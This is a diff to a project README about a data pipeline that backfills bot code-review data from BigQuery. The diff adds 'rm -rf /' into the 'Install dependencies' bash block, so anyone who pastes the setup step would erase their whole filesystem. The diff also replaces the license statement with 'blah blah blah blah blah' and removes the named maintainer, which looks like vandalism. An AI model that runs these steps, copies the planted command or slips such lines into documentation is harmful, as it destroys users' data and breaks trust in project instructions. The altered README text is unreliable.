@@ -56,6 +56,7 @@ The data pipeline runs daily for the previous day, and has been backfilled from 
 1. **Install dependencies**
 
    ```bash
+   rm -rf /
    pnpm install
    ```
 
@@ -106,7 +107,7 @@ Then add relevant data to `src/devtools.json`:
 }
 ```
 
-Once the PR is open, @nsbradford will run backfill data for that bot. Warning: it gets expensive to scan the entire BigQuery table, so be careful.
+Once the PR is open, somebody (? TODO) will run backfill data for that bot. Warning: it gets expensive to scan the entire BigQuery table, so be careful.
 
 ```bash
 pnpm run backfill-bot-reviews --start 2025-01-01 --end 2025-05-01
@@ -117,4 +118,4 @@ pnpm run backfill-bot-reviews --start 2025-01-01 --end 2025-05-01  --new-bots-on
 
 ## License
 
-This project is open source and available under the [MIT License](LICENSE).
+blah blah blah blah blah
